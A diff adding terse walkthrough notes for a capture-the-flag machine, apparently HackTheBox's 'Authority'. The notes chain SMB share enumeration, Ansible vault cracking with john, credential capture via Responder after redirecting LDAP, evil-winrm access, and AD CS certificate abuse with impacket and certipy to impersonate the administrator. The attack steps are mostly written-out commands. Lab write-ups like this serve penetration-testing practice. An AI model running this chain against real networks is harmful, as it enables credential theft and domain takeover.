@@ -1,0 +1,20 @@
+	USR
+smb -H <target> -u " "
+smbget -R smb://<share>/<directory> 
+disclosure ansible key -> \\<target>\Development\Automation\Ansible\PWM\defaults\main.yml
+processing vaults key in vault.yml -> https://fossies.org/linux/john/run/ansible2john.py
+python ansible2john.py vault1.yml > hash
+john -w:/rockyou.txt hash -> extract master-ansible password
+cat vault.yml | ansible-vault decrypt -> extract 3 passwords
+login webapp with previous password -> download config ldap automation -> edit ldaps to ldap and port -> upload config
+run responder -I eth0 -> obtain svc_ldap cleartext password
+evil-winrm -i <target> -u <user> -p <password>
+	ROOT
+certify.exe find /vulnerable -> corpVPN template is vulnerable
+...check user permission -> you can add a new computer account
+impacket-addcomputer  authority.htb/svc_ldap:'<SVC_PASSWORD>' -computer-name <newcomputer>$ -computer-pass Password123
+certipy req -u '<newcomputer>$' -p 'Password123' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.htb -dc-ip <target>
+...generate administrator_authority.pfx file
+certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
+certipy cert -pfx administrator_authority.pfx -nocert -out user.key
+
